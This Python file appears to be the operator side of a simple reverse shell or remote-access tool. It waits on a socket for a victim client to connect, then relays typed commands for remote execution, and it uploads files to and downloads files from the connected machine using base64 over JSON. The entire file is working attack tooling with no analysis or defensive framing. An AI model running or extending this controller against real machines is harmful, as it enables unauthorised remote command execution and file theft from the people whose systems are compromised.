from termcolor import colored
from socket import *
import sys
import json
import base64

class Server:
    def __init__(self,ip,port):
        self.ip = ip 
        self.port = port 
        print(colored("[+] Starting the program...",'red'))

            ## initialize a socket on server side
        server_socket = socket(AF_INET,SOCK_STREAM)
        server_socket.bind((self.ip,self.port))
        server_socket.listen(5)
        ## accept only 5 connections from clients
        
        print(colored('[+] Waiting for connecting from client','green'))
        self.connection,Client = server_socket.accept()

        print(colored('[+] A connection established from {}'.format(Client),'green'))
    
    def execute_remotely(self,command): 
        if command[0] == 'exit':
            self.send_data(command[0])
            self.connection.close()
            sys.exit()
        else:
            self.send_data(command)
            return self.receive_data()    
    def send_data(self,data):
        ## convert data to json format and continue covert to bytes
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive_data(self):
        data = b""
        while True: 
            try:
                ## concatenate data until enough by checking ValueError
                data = data + self.connection.recv(1024)
                    ## because data in byte format so we have to convert them to str 
                return json.loads(data.decode())
            except ValueError:
                continue

    def read_file(self,path):
        with open(path,'rb') as output:
                ## convert binary to bytes 
            return base64.b64encode(output.read())

    def write_file(self,path,content):
        with open(path,'wb') as output:
            # convert content to bytes and continue decode with base64
            output.write(base64.b64decode(content.encode()))
        return '[+] Write data to file succesfully!'

    ## starting the program from run function
    def run(self):
        result = ""
        while True: 
            try: 
                ## take commands 
                command = input(">> ")
                command = command.split(" ")

                ## check if upload file -> read file and send content                
                if command[0] == 'upload'and len(command)>1:
                    content = self.read_file(command[1])
                    ## convert bytes to string before serialize using json format
                    ## because json only accepts string,list,dict...
                    command.append(content.decode())
                
                result = self.execute_remotely(command)
                
                ## check whether command is download? and not any error during executing
                if command[0] == 'download' and '[-]' not in result:
                    result = self.write_file(command[1],result)
            
            except KeyboardInterrupt:
                break
            
            except Exception as e: 
                print(colored('[-] An Error has occured during running the program: '+str(e),'red'))
            print(result)


sv = Server('localhost',2222)
sv.run()